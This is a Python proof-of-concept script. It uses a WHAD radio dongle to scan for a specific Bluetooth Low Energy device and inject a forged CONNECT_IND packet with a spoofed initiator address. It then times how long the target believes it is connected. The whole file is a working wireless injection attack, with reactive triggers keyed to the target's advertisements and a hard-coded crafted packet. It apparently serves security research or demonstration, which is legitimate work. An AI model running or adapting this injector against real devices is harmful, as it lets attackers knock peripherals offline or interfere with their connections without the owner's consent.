#!/usr/bin/env python3
# 7_connect_lifecycle.py — scan -> confirm -> inject OUR 36 bytes -> detect connection + duration
import argparse, time, threading, sys

def _parse_args():
    p = argparse.ArgumentParser(description="Inject CONNECT_IND and measure acceptance + believed-connected duration.")
    p.add_argument("mac", nargs="?", default="C0:00:00:41:73:AC", help="target MAC (default: %(default)s)")
    p.add_argument("--scan-time", type=int, default=30, help="scan window seconds (default: %(default)s)")
    p.add_argument("--window", type=int, default=75, help="watch window seconds (default: %(default)s)")
    p.add_argument("--port", default="uart0", help="WHAD dongle port (default: %(default)s)")
    return p.parse_args()

ARGS = _parse_args()

TARGET     = ARGS.mac
TARGET_KEY = TARGET.replace(":", "").upper()
ADVA_WIRE  = bytes.fromhex(TARGET_KEY)[::-1]
PDU_HEX    = "8522AABBCCDDEEFFAC73410000C0A1B2C3D412345602000018000000C800FFFFFFFF1F2D"
RAW        = bytes.fromhex(PDU_HEX)
SCAN_TIME, WINDOW = ARGS.scan_time, ARGS.window
T0 = time.time()

def ts(): return f"{time.time()-T0:7.2f}s"

from whad.device import WhadDevice
from whad.ble.connector import Injector
from whad.common.triggers import ReceptionTrigger
from scapy.layers.bluetooth4LE import BTLE, BTLE_ADV_IND

dev = WhadDevice.create(ARGS.port)
inj = Injector(dev)

FOUND, FIRED = threading.Event(), threading.Event()
GAP_OPEN, RESUMED = threading.Event(), threading.Event()
adv_times, events = [], []
lock = threading.Lock()

def log(msg):
    line = f"[{ts()}] {msg}"
    print(line, flush=True); events.append(line)

# ---- ADV listener: every received ADV from target gets timestamped ----
_orig_adv = inj.on_adv_pdu
def _on_adv(pkt, *a, **k):
    try:
        if ADVA_WIRE in bytes(pkt):
            with lock: adv_times.append(time.time())
            FOUND.set()
    except Exception: pass
    try: return _orig_adv(pkt, *a, **k)
    except Exception: pass
inj.on_adv_pdu = _on_adv

# ---- FIRE hooks (both dispatch paths) ----
_orig_trig = inj.on_triggered
def _on_trig(*a, **k):
    if not FIRED.is_set():
        FIRED.set()
        log(">>> FIRE — YOUR 36-BYTE CONNECT_IND WAS TRANSMITTED ON-AIR <<<")
    try: return _orig_trig(*a, **k)
    except Exception: pass
inj.on_triggered = _on_trig

log("scan/inject starting on uart0")
for name, fn in (("enable_scan_mode", lambda: inj.enable_scan_mode()),
                 ("sniff_advertisements", lambda: inj.sniff_advertisements())):
    try: fn(); log(f"RX mode: {name}()"); break
    except Exception as e: log(f"- {name}: {type(e).__name__}: {e}")
else:
    log("no RX mode available"); sys.exit(1)
try: inj.start()
except Exception as e: log(f"start(): {type(e).__name__}: {e} (continuing)")

# ---------- PHASE 1: SCAN + CONFIRM + measure its ADV interval ----------
log(f"PHASE 1 — scanning for {TARGET} (up to {SCAN_TIME}s)")
t0 = time.time()
while time.time()-t0 < SCAN_TIME and not FOUND.is_set(): time.sleep(0.1)
if not FOUND.is_set():
    log("NOT FOUND — not advertising. Pairing mode / disconnect from phone, re-run."); sys.exit(2)
time.sleep(2.0)  # collect more ADVs to measure interval
with lock: n = len(adv_times)
interval = (adv_times[-1]-adv_times[0])/(n-1) if n >= 3 else None
log(f"DEVICE IS THERE — {n} ADV packets received"
    + (f", its ADV interval ≈ {interval*1000:.0f} ms" if interval else ""))

# ---------- PHASE 2: ARM (scan mode stays ON -> radio keeps listening) ----------
log("PHASE 2 — arming reactive triggers")
PKT = BTLE(bytes.fromhex("D6BE898E") + RAW)
assert bytes(PKT)[4:] == RAW, "round-trip mismatch"
armed = 0
for nm, mk in (("AdvA@off0", lambda: ReceptionTrigger(pattern=ADVA_WIRE, mask=b"\xff"*6, offset=0)),
               ("AdvA@off2", lambda: ReceptionTrigger(pattern=ADVA_WIRE, mask=b"\xff"*6, offset=2)),
               ("AdvA@off6", lambda: ReceptionTrigger(pattern=ADVA_WIRE, mask=b"\xff"*6, offset=6)),
               ("autoADV",   lambda: ReceptionTrigger(packet=BTLE_ADV_IND(AdvA=TARGET)))):
    try:
        trig = mk(); inj.prepare(PKT, trigger=trig); inj.trigger(trig)
        _o = getattr(trig, "trigger", None)
        def _h(*a, **k):
            if not FIRED.is_set():
                FIRED.set(); log(">>> FIRE — YOUR 36-BYTE CONNECT_IND WAS TRANSMITTED ON-AIR <<<")
            try: return _o(*a, **k) if callable(_o) else None
            except Exception: return None
        trig.trigger = _h
        armed += 1; log(f"ARMED {nm}")
    except Exception as e:
        log(f"- {nm}: {type(e).__name__}: {e}")
if not armed: log("nothing armed"); sys.exit(3)

# ---------- PHASE 3: WATCH — FIRE, connection gap, resume, duration ----------
log(f"PHASE 3 — watching {WINDOW}s: connection evidence = ADV stream stops right after FIRE")
log("(also watch MDT2410161 on your PHONE: VANISH = it accepted your packet)")
threshold = max(0.8, (4*interval) if interval else 3.0)
gap_start, last_print = None, 0
t0 = time.time()
try:
    while time.time()-t0 < WINDOW:
        now = time.time()
        with lock: last_adv = adv_times[-1] if adv_times else None
        if FIRED.is_set() and last_adv and now-last_adv > threshold:
            if gap_start is None:
                gap_start = last_adv; GAP_OPEN.set()
                log(">>> DEVICE STOPPED ADVERTISING — IT ACCEPTED YOUR CONNECT_IND <<<")
                log(">>> IT BELIEVES IT IS NOW CONNECTED (to InitA FF:EE:DD:CC:BB:AA) <<<")
        elif gap_start is not None and last_adv and last_adv > gap_start + threshold/2:
            dur = last_adv - gap_start; RESUMED.set()
            log(f"<<< DEVICE RESUMED ADVERTISING — CONNECTION OVER <<<")
            log(f"<<< Believed-connected for ≈ {dur:.2f} s | YOUR packet's timeout = 2.00 s"
                + ("  → MATCHES: it obeyed YOUR LLData field!" if abs(dur-2.0) <= 0.8 else "") + " >>>")
            break
        if now - last_print >= 5:
            last_print = now
            with lock: c = len(adv_times)
            state = ("FIRED - packet sent" if FIRED.is_set() else "armed, waiting")
            if GAP_OPEN.is_set() and not RESUMED.is_set(): state += " | CONNECTED (no ADVs)"
            log(f"... ADVs:{c:>4}  {state}")
        time.sleep(0.05)
except KeyboardInterrupt: pass

# ---------- SUMMARY ----------
log("="*70)
log("TIMELINE:")
for e in events: log("  " + e)
log("="*70)
if RESUMED.is_set():
    log("VERDICT: SENT ✓  ACCEPTED ✓  CONNECTION LIFETIME MEASURED ✓  — DEMO COMPLETE")
elif GAP_OPEN.is_set():
    log("VERDICT: SENT ✓  ACCEPTED ✓  still quiet at window end (check phone)")
elif FIRED.is_set():
    log("VERDICT: SENT ✓  but device kept advertising → it ignored/rejected the CONNECT_IND")
else:
    log("VERDICT: never fired — device stopped advertising first (phone grabbed it?)")
try: dev.close()
except Exception: pass
